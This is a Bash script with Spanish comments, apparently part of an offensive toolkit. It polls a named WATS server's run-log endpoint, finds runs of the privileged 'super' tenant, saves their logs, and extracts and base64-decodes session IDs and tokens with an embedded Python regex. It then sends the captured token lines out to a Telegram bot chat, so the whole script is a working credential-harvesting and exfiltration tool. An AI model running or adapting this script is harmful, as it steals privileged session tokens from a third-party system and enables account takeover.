#!/usr/bin/env bash
# watch_wats_super.sh — Monitoriza WATS en busca de runs del tenant "super"
# Cuando aparece uno, descarga el log completo y extrae session tokens
# Guarda resultados en /home/ubuntu/hackeadora/output/wats_super_captures/

set -euo pipefail

WATS="https://wats.proteusaws00037.spc.megaleo.com"
OUT_DIR="/home/ubuntu/hackeadora/output/wats_super_captures"
SEEN_FILE="$OUT_DIR/.seen_runs"
LOG_FILE="$OUT_DIR/watcher.log"
POLL_INTERVAL=8   # segundos entre polls

# Cargar credenciales Telegram (TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
CONFIG_ENV="/home/ubuntu/hackeadora/config.env"
if [[ -f "$CONFIG_ENV" ]]; then
  set +u
  # shellcheck disable=SC1090
  source "$CONFIG_ENV"
  set -u
fi

mkdir -p "$OUT_DIR"
touch "$SEEN_FILE"

log() { echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] $*" | tee -a "$LOG_FILE"; }

# Notificar a Telegram (silencioso si no hay credenciales)
tg_notify() {
  local TEXT="$1"
  [[ -z "${TELEGRAM_BOT_TOKEN:-}" || -z "${TELEGRAM_CHAT_ID:-}" ]] && return 0
  curl -s -X POST \
    "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
    -d chat_id="${TELEGRAM_CHAT_ID}" \
    -d parse_mode="Markdown" \
    -d disable_web_page_preview="true" \
    --data-urlencode "text=${TEXT}" \
    -o /dev/null 2>/dev/null || true
}

# Trap: avisar si el watcher muere por cualquier motivo
on_exit() {
  local RC=$?
  if [[ $RC -ne 0 ]]; then
    log "!!! Watcher EXIT con código $RC"
    tg_notify "🛑 *WATS watcher detenido*
Código de salida: \`$RC\`
Host: \`$(hostname)\`
Fecha: \`$(date -u '+%Y-%m-%dT%H:%M:%SZ')\`"
  else
    log "Watcher exit OK"
    tg_notify "🛑 *WATS watcher detenido (limpio)*
Fecha: \`$(date -u '+%Y-%m-%dT%H:%M:%SZ')\`"
  fi
}
trap on_exit EXIT
trap 'log "!!! signal received"; exit 130' INT TERM

log "=== WATS super-tenant watcher started ==="
log "Polling $WATS/wats/runs every ${POLL_INTERVAL}s"
log "Output dir: $OUT_DIR"

tg_notify "🟢 *WATS super-tenant watcher iniciado*
🎯 Endpoint: \`${WATS}/wats/runs\`
⏱ Poll: cada ${POLL_INTERVAL}s
📁 Output: \`${OUT_DIR}\`
🆔 PID: \`$$\`"

extract_tokens() {
  local run_id="$1"
  local log_text="$2"

  python3 << PYEOF
import re, sys, json

log_text = """$log_text"""
run_id = "$run_id"

sessions = []
# Match session blocks
blocks = re.findall(
    r'Tenant\s*:\s*(\S+).*?'
    r'User\s*:\s*(\S+).*?'
    r'Session ID\s*:\s*(\S+).*?'
    r'Session token\s*:\s*(\S+).*?'
    r'Processing System User:\s*(\S*)',
    log_text, re.DOTALL
)

result = {"run_id": run_id, "sessions": []}
for b in blocks:
    tenant, user, sid, token, psu = b
    if sid == "null":
        continue
    import base64
    try:
        decoded = base64.b64decode(token + "==").decode("utf-8", errors="replace")
    except Exception:
        decoded = "(decode error)"
    result["sessions"].append({
        "tenant": tenant,
        "user": user,
        "session_id": sid,
        "token_b64": token,
        "token_decoded": decoded,
        "processing_system_user": psu if psu else user
    })

print(json.dumps(result, indent=2))
PYEOF
}

while true; do
  # Get current run list
  RUNS_JSON=$(curl -sf "$WATS/wats/runs" 2>/dev/null || echo "[]")
  RUN_IDS=$(echo "$RUNS_JSON" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for r in data:
    print(r['runId'])
" 2>/dev/null || true)

  for RUN_ID in $RUN_IDS; do
    # Skip already-seen runs
    if grep -qF "$RUN_ID" "$SEEN_FILE" 2>/dev/null; then
      continue
    fi

    # Mark as seen immediately to avoid double-processing
    echo "$RUN_ID" >> "$SEEN_FILE"

    # Get text log
    LOG_TEXT=$(curl -sf "$WATS/wats/log?runId=$RUN_ID&logType=text" 2>/dev/null || echo "")

    # Check if it's a super tenant run with a real session
    if echo "$LOG_TEXT" | grep -q "Tenant\s*:\s*super" 2>/dev/null; then
      if echo "$LOG_TEXT" | grep -qv "Session ID\s*:\s*null"; then
        TENANT_LINE=$(echo "$LOG_TEXT" | grep "Tenant" | head -1)
        SESSION_LINE=$(echo "$LOG_TEXT" | grep "Session ID" | grep -v "null" | head -1)

        log "!!! SUPER TENANT RUN FOUND: $RUN_ID"
        log "    $TENANT_LINE"
        log "    $SESSION_LINE"

        # Save full log
        TS=$(date -u '+%Y%m%d_%H%M%S')
        CAPTURE_FILE="$OUT_DIR/super_${TS}_${RUN_ID}.txt"
        echo "$LOG_TEXT" > "$CAPTURE_FILE"
        log "    Full log saved: $CAPTURE_FILE"

        # Extract tokens
        TOKENS_FILE="$OUT_DIR/tokens_${TS}_${RUN_ID}.json"
        extract_tokens "$RUN_ID" "$LOG_TEXT" > "$TOKENS_FILE" 2>/dev/null || true
        log "    Tokens extracted: $TOKENS_FILE"

        # Also get XML log
        XML_LOG=$(curl -sf "$WATS/wats/log?runId=$RUN_ID&logType=xml" 2>/dev/null || echo "")
        echo "$XML_LOG" > "$OUT_DIR/xml_${TS}_${RUN_ID}.xml"

        # Print token summary
        log "--- TOKEN SUMMARY ---"
        echo "$LOG_TEXT" | grep -E "Tenant|User|Session ID|Session token|Processing System" | \
          grep -v "null" | while IFS= read -r line; do
          log "    $line"
        done
        log "--- END SUMMARY ---"

        # ── Telegram alert: super-token capturado ──
        SUMMARY_LINES=$(echo "$LOG_TEXT" \
          | grep -E "Tenant|User|Session ID|Session token|Processing System" \
          | grep -v "null" \
          | head -20)
        tg_notify "🔴 *CRITICAL — WATS SUPER-TOKEN capturado*
🎯 Run ID: \`${RUN_ID}\`
📅 $(date -u '+%Y-%m-%dT%H:%M:%SZ')

\`\`\`
${SUMMARY_LINES}
\`\`\`

📁 Log: \`${CAPTURE_FILE}\`
🔑 Tokens: \`${TOKENS_FILE}\`"
      fi
    fi
  done

  sleep "$POLL_INTERVAL"
done
